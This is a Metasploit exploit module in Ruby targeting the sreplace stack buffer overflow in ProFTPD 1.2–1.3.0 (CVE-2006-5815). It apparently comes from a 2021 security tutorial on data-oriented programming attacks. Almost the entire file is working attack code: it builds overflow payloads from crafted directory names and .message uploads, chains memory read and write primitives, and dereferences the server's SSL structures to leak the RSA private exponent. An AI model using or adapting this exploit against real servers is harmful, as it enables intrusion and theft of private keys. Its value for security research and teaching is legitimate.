##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

$path_to_byte_map = '/home/secdev/tutorial-secdev-2021/dop/exploit/byte_map.rb'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in versions 1.2 through
        1.3.0 of ProFTPD server. The vulnerability is within the "sreplace" function
        within the "src/support.c" file.

        The off-by-one heap overflow bug in the ProFTPD sreplace function has been
        discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit
        this off-by-one bug via MKD command, but failed. We did not work on this bug
        since then.

        Actually, there are exists at least two bugs in sreplace function, one is the
        mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow
        via 'sstrncpy(dst,src,negative argument)'.

        We were unable to reach the "sreplace" stack bug on ProFTPD 1.2.10 stable
        version, but the version 1.3.0rc3 introduced some interesting changes, among them:

        1. another (integer) overflow in sreplace!
        2. now it is possible to reach sreplace stack-based buffer overflow bug via
          the "pr_display_file" function!
        3. stupid '.message' file display bug

        So we decided to choose ProFTPD 1.3.0 as a target for our exploit.
        To reach the bug, you need to upload a specially created .message file to a
        writeable directory, then do "CWD <writeable directory>" to trigger the invocation
        of sreplace function.

        Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message'
        file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug.

        The exploit is a part of VulnDisco Pack since Dec 2005.
      },
      'Author'         =>
        [
          'Evgeny Legerov <admin[at]gleg.net>',  # original .pm version (VulnDisco)
          'jduck'   # Metasploit 3.x port
        ],
      'References'     =>
        [
          [ 'CVE', '2006-5815' ],
          [ 'OSVDB', '68985' ],
          [ 'BID', '20992' ],
          [ 'URL', 'http://seclists.org/bugtraq/2006/Nov/94' ],
          [ 'URL', 'http://seclists.org/bugtraq/2006/Nov/538' ],
          [ 'URL', 'http://bugs.proftpd.org/show_bug.cgi?id=2858' ],
          [ 'URL', 'http://proftp.cvs.sourceforge.net/proftp/proftpd/src/main.c?view=diff&r1=text&tr1=1.292&r2=text&tr2=1.294&diff_format=h' ]
        ],
      'Targets'        =>
        [
          ['Default', { } ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'Platform'       => [ 'linux' ],
      'DisclosureDate' => 'Nov 26 2006'))

    register_options(
      [
        OptString.new('NON_EMPTY_HIGH', [ true, 'Address of a non empty string in the stack/library region', '0x08048001' ]), # to be decided
        Msf::Opt::RHOST("192.168.56.101"),
        Msf::Opt::RPORT(21),
      ], self.class )

    # Address of the mons global variable
    # 080dc6c0 <mons.8475>:
    @MONS_ADDR = 0x080dc6c0

    # We need a global variable whose value is also a global pointer
    # (that is, a 0x80... value stored at an 0x80... address)
    # 080e0400 <auth_unix_module>:
    #         ...
    #  80e0408:       20 00                   and    %al,(%eax)
    #  80e040a:       00 00                   add    %al,(%eax)
    #  80e040c:       a3 76 0c 08 30          mov    %eax,0x30080c76
    #  80e0411:       04 0e                   add    $0xe,%al
    #  80e0413:       08 00                   or     %al,(%eax)
    @G_PTR_ADDR = 0x80e0410
    @G_PTR = 0x080e0430

    # Path to the file containing the byte map
    @BYTE_MAP_PATH = $path_to_byte_map
    require @BYTE_MAP_PATH

    # a writable directory (needs to be '/')
    @WRITABLE = '/'

    # Address of an empty string
    @EMPTY = 0x0804b3b9

    # Address of a non empty string in the code region 
    @NON_EMPTY_LOW = 0x0804b3be

    # Address of some empty area in the data section
    @DATA_START = 0x080dc4b1

    # Address of the resp_buf variable
    # 080e6000 <resp_buf>:
    @RESP_BUF = 0x80e6000

    # Address of the main_server variable
    # 080e3dec <main_server>:
    @MAIN_SERVER_ADDR = 0x080e3dec

    # Address of session.total_bytes_out
    # $ gdb ~/dop-attacks/proftpd-1.3.0/proftpd
    # ...
    # (gdb) p &session.total_bytes_out 
    # $1 = (off_t *) 0x80edbfc
    @SESSION_TOTAL_BYTES_OUT = 0x80edbfc

    # Address of the ssl_ctx variable
    # 080eb0a8 <ssl_ctx>:
    @SSL_CTX = 0x80eb0a8
  end


  def check
    # NOTE: We don't care if the login failed here...
    ret = connect

    # We just want the banner to check against our targets..
    vprint_status("FTP Banner: #{banner.strip}")

    status = CheckCode::Safe

    if banner =~ /ProFTPD (1\.[23]\.[^ ])/i
      ver = $1
      maj,min,rel = ver.split('.')
      relv = rel.slice!(0,1)
      case relv
      when '2'
        status = CheckCode::Appears

      when '3'
        # 1.3.x before 1.3.1 is vulnerable
        status = CheckCode::Appears
        if rel.length > 0
          if rel.to_i > 0
            status = CheckCode::Safe
          else
            status = CheckCode::Appears
          end
        end
      end
    end

    disconnect
    return status
  end

  def check_number_has(x, b)
    for i in 0..3
      if ((x >> (i * 8)) & 0xff) == b
        return true
      end
    end

    return false
  end

  def check_number(x)
    return (not check_number_has(x, 0x0) and not check_number_has(x, 0xa) and
            not check_number_has(x, 0xff) and not check_number_has(x, 0x2a) and
            not check_number_has(x, 0x2f))
  end

  def try_split(x)
    l = []
    for i in 1..0xe
      l << (0x11111111 * i)
    end

    l.each { |a|
      b = x - a
      if check_number(b)
        return a, b
      end
    }

    fail_with(Failure::Unknown, "Couldn't split %x" % x)
  end

  def read(addr, n, non_empty)
    res = send_cmd(['CWD', @WRITABLE])

    pwd = send_cmd(['PWD'])
    if pwd !~ /257\s\"(.+)\"/
      fail_with(Failure::Unknown, "Unable to get current working directory")
    end
    pwd = $1
    pwd << "/" if pwd[-1,1] != "/"

    #rarr[1] = addr
    dir1 = "\x80\x04\x08" + [addr].pack('V') + 'E'*(90 - pwd.length - 3 - 4)

    send_cmd(['MKD', dir1])

    send_cmd(['CWD', dir1])

    send_cmd(['PWD'])

    dir2 = "B" * 233

    dst = @G_PTR

    a, b = try_split(dst)
    #puts "split %x %x %x" % [dst, a, b]

    #cp + rlen = dest
    #cp
    dir2[221..224] = [a].pack('V')
    #rlen
    dir2[185..188] = [b].pack('V')

    a, b = try_split(non_empty + 1)
    #puts "split %x %x %x" % [non_empty + 1, a, b]

    #src + mlen = empty_str
    #mlen
    dir2[205..208] = [a].pack('V')
    #src
    dir2[225..228] = [b].pack('V')

    blen = dst - non_empty + 1 + n
    if not check_number(blen)

      non_empty = non_empty + 3

      blen = dst - non_empty + 1 + n
      if not check_number(blen)
        fail_with(Failure::Unknown, "%x and %x are not compatible: %x" % [dst, non_empty, blen])
      end
    end

    #pbuf
    dir2[209..212] = [non_empty].pack('V')

    #blen
    dir2[201..204] = [blen].pack('V')

    #marr[0]
    dir2[41..44] = [non_empty].pack('V')

    #marr[1]
    dir2[45..48] = [@EMPTY].pack('V')

    #mptr
    dir2[217..220] = [non_empty].pack('V')

    send_cmd(['DELE', "#{dir2}/AA/.message"])
    send_cmd(['RMD', "#{dir2}/AA"])
    send_cmd(['DELE', "#{dir2}/.message"])
    send_cmd(['RMD', dir2])

    filedata = "\x25C" * 12 + 'C' * 300 + "\x25C" * 40

    res = send_cmd(['MKD', dir2])
    res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

    # Trigger sreplace overflow
    res = send_cmd(['CWD', dir2])

    res = send_cmd(['MKD', 'AA'])
    send_cmd_data(['PUT', "AA/.message"], "\x25T", 'I')

    send_cmd(['CWD', 'AA'], recv=false)

    res = self.sock.get()
    #send_cmd(['CWD', 'AA'])
    return res
  end

  def copy(dst, src, n, non_empty)
    res = send_cmd(['CWD', @WRITABLE])

    pwd = send_cmd(['PWD'])
    if pwd !~ /257\s\"(.+)\"/
      fail_with(Failure::Unknown, "Unable to get current working directory")
    end
    pwd = $1
    pwd << "/" if pwd[-1,1] != "/"

    #rarr[1] = addr
    dir1 = "\x80\x04\x08" + [src].pack('V') + 'E'*(90 - pwd.length - 3 - 4)

    send_cmd(['MKD', dir1])

    send_cmd(['CWD', dir1])

    send_cmd(['PWD'])

    dir2 = "B" * 233

    a, b = try_split(dst)
    #puts "split %x %x %x" % [dst, a, b]

    #cp + rlen = dest
    #cp
    dir2[221..224] = [a].pack('V')
    #rlen
    dir2[185..188] = [b].pack('V')

    blen = dst - non_empty + 1 + n
    if not check_number(blen)

      non_empty = non_empty + 3

      blen = dst - non_empty + 1 + n
      if not check_number(blen)
        fail_with(Failure::Unknown, "%x and %x are not compatible: %x" % [dst, non_empty, blen])
      end
    end

    a, b = try_split(non_empty + 1)
    #puts "split %x %x %x" % [non_empty + 1, a, b]

    #src + mlen = empty_str
    #mlen
    dir2[205..208] = [a].pack('V')
    #src
    dir2[225..228] = [b].pack('V')

    #pbuf
    dir2[209..212] = [non_empty].pack('V')

    #blen
    dir2[201..204] = [blen].pack('V')
    #marr[0]
    dir2[41..44] = [non_empty].pack('V')

    #marr[1]
    dir2[45..48] = [@EMPTY].pack('V')

    #mptr
    dir2[217..220] = [non_empty].pack('V')

#    dir2 = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A'

    send_cmd(['DELE', "#{dir2}/.message"])
    send_cmd(['RMD', dir2])

    filedata = "\x25C" * 12 + 'C' * 300 + "\x25C" * 40

    res = send_cmd(['MKD', dir2])
    res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

    # Trigger sreplace overflow
    send_cmd(['CWD', dir2])
  end

  def write0(dst, non_empty)
    res = send_cmd(['CWD', @WRITABLE])

    pwd = send_cmd(['PWD'])
    if pwd !~ /257\s\"(.+)\"/
      fail_with(Failure::Unknown, "Unable to get current working directory")
    end
    pwd = $1
    pwd << "/" if pwd[-1,1] != "/"

    dir1 = "\x80\x04\x08" + 'E'*(90 - pwd.length - 3)

    send_cmd(['MKD', dir1])

    send_cmd(['CWD', dir1])

    send_cmd(['PWD'])

    dir2 = "B" * 233

    blen = dst - non_empty + 1
    if not check_number(blen)
      non_empty = non_empty + 3

      blen = dst - non_empty + 1
      if not check_number(blen)
        fail_with(Failure::Unknown, "%x and %x are not compatible: %x" % [dst, non_empty, blen])
      end
    end

    x = blen + non_empty - 1
    a, b = try_split(x + 1)

    #cp
    dir2[221..224] = [a].pack('V')
    #rlen
    dir2[185..188] = [b].pack('V')


    #pbuf
    dir2[209..212] = [non_empty].pack('V')

    #blen
    dir2[201..204] = [blen].pack('V')

#    dir2 = 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A'

    send_cmd(['DELE', "#{dir2}/.message"])
    send_cmd(['RMD', dir2])

    filedata = "\x25C" * 12 + 'C' * 300 + "\x25C" * 40

    res = send_cmd(['MKD', dir2])
    res = send_cmd_data(['PUT', "#{dir2}/.message"], filedata, 'I')

    # Trigger sreplace overflow
    send_cmd(['CWD', dir2])
  end

  def write_string(data, addr, non_empty)

    data.each_byte { |b|
      if b == 0
#        puts "writing 0 to %x" % addr
        write0(addr, non_empty)
      else
        src_addr = BYTE_MAP[b.to_s(16)].to_i(16)

#        puts "writing %s from %x to %x" % [b.to_s(16), src_addr, addr]
        copy(addr, src_addr, 4, non_empty)
      end

      addr = addr + 1
    }
  end

  def deref
    res = send_cmd(['CWD', @WRITABLE])

    send_cmd(['DELE', "BB/.message"])
    send_cmd(['RMD', "BB"])

    filedata='C' * 1020 + "\x25V"

    send_cmd(['MKD', 'BB'])
    send_cmd_data(['PUT', "BB/.message"], filedata, 'I')

    send_cmd(['CWD', 'BB'], recv=false)
    res = self.sock.get()
  end

  def add(v)
    res = send_cmd(['CWD', @WRITABLE])

    send_cmd(['DELE', "add"])

    send_cmd_data(['PUT', "add"], "A" * v, 'I')

    send_cmd_data(['GET', "add"], [], 'I')
  end

  def read2
    res = send_cmd(['CWD', @WRITABLE])

    send_cmd(['DELE', "BB/.message"])
    send_cmd(['RMD', "BB"])

    filedata="\x25V"

    send_cmd(['MKD', 'BB'])
    send_cmd_data(['PUT', "BB/.message"], filedata, 'I')

    send_cmd(['CWD', 'BB'], recv=false)
    res = self.sock.get()

    puts res
  end

  def exploit
    connect_login

    # in the following for loop, not only mons[] array is changed, but also
    # the days[] which is immediate after mons[]. Fortunately only days[0] 
    # and days[1] are changed, and the new pointers point to "" and "v" 
    # respectively. So we have to patch the length of the output 
    time = Time.now    # Convert number of seconds into Time object.
    result_start = 8
    result_end   = 11
    if time.wday == 0  # Sun
      result_start = 5
      result_end   = 8
    elsif time.wday == 1
      result_start = 6
      result_end   = 9 
    end 

    ne_hi = datastore['NON_EMPTY_HIGH'].to_i(16)
    ne_lo = @NON_EMPTY_LOW

    for i in 0..11
      copy(@MONS_ADDR + 4 * i, @G_PTR_ADDR, 4, ne_hi)
    end

    write_string([@SSL_CTX].pack("V"), @DATA_START, ne_hi)
    write_string('a', @DATA_START+4, ne_hi)
    write_string('a', @DATA_START+5, ne_hi)
    write_string('a', @DATA_START+6, ne_hi)
    write0(@DATA_START+7, ne_hi)

    a = read(@MAIN_SERVER_ADDR, 4, ne_hi)
    main_srv = a[result_start..result_end].unpack("V")[0]
    puts "main_srv @ %x" % main_srv

    ptr = main_srv + 0x10
    d = @RESP_BUF + 1024

    add_loc = @SESSION_TOTAL_BYTES_OUT

    copy(ptr, @DATA_START, 6, ne_hi)

    #############################################################
    # *&ssl_ctx -> ssl_ctx
    deref


    # ssl_ctx + 0xb0
    # this should be only one line: copy(add_loc, d, 4, ne_hi)
    # this is a workaround for the fact that d has a zero byte   
    # same for other calls below
#    write_string('a', d+4, ne_hi); write0(d+5, ne_hi)
    copy(d+4, 0x8048005, 1, ne_hi);
    copy(add_loc-2, d-2, 6, ne_hi)

    add(0xb0)

    sleep(0.5)
#    puts "here1"; bleh = $stdin.gets
    copy(ptr, add_loc, 4, ne_hi)

    sleep(0.5)    
#    puts "here2"; bleh = $stdin.gets

    # *(ssl_ctx + 0xb0) -> cert
    deref

    sleep(0.5)    
#    puts "here3"; bleh = $stdin.gets    

    # &cert_pkey = cert + 0
    copy(d+4, 0x8048005, 1, ne_hi);
    copy(ptr-2, d-2, 6, ne_hi)

    sleep(0.5)    
#    puts "here4"; bleh = $stdin.gets

    # *(cert + 0) -> cert_pkey
    deref

    sleep(0.5)
#    puts "here5"; bleh = $stdin.gets

    # &evp_pkey = cert_pkey + 4
    copy(d+4, 0x8048005, 1, ne_hi);
    copy(add_loc-2, d-2, 6, ne_hi)
    add(0x4)
    copy(ptr, add_loc, 4, ne_hi)

    sleep(0.5)    
#    puts "here6"; bleh = $stdin.gets

    # *(cert_pkey + 4) -> evp_pkey
    deref

    sleep(0.5)    
#    puts "here7"; bleh = $stdin.gets

    copy(d+4, 0x8048005, 1, ne_hi);
    copy(add_loc-2, d-2, 6, ne_hi)
    add(0x14)
    copy(ptr, add_loc, 4, ne_hi)

    sleep(0.5)    
#    puts "here8"; bleh = $stdin.gets

    # *(evp_pkey + 0x14) -> rsa
    deref

    sleep(0.5)    
#    puts "here9"; bleh = $stdin.gets

    # &rsa_d = rsa + 0x18
    copy(d+4, 0x8048005, 1, ne_hi);
    copy(add_loc-2, d-2, 6, ne_hi)
    add(0x18)
    copy(ptr, add_loc, 4, ne_hi)

    sleep(0.5)    
#    puts "here10"; bleh = $stdin.gets

    # *(rsa + 0x18) -> rsa_d
    deref

    sleep(0.5)    
#    puts "here11"; bleh = $stdin.gets

    # &rsa_d_arr = rsa_d + 0
    copy(d+4, 0x8048005, 1, ne_hi);
    copy(ptr-2, d-2, 6, ne_hi)

    sleep(0.5)    
#    puts "here12"; bleh = $stdin.gets

    # *(rsa_d + 0) -> rsa_d_arr
    deref

    sleep(0.5)    
#    puts "here13"; bleh = $stdin.gets

    copy(d+4, 0x8048005, 1, ne_hi);
    copy(ptr-2, d-2, 6, ne_hi)


    aa = read(d-2, 6, ne_hi)
    result_start = result_start + 2
    result_end   = result_end   + 2
    d_val = aa[result_start..result_end].unpack("V")[0]

    puts "d @ %x" % d_val

    write0(main_srv + 0x24, ne_hi)
    write0(main_srv + 0x25, ne_hi)
    write0(main_srv + 0x26, ne_hi)
    write0(main_srv + 0x27, ne_hi)

    result_start = result_start - 2
    result_end   = result_end   - 2

    for i in 0..63
      aaa= read(d_val + i * 4, 4, ne_hi)
      x = aaa[result_start..result_end].unpack("H*")[0]
      print x
    end

    puts ""

    disconnect

  end

end
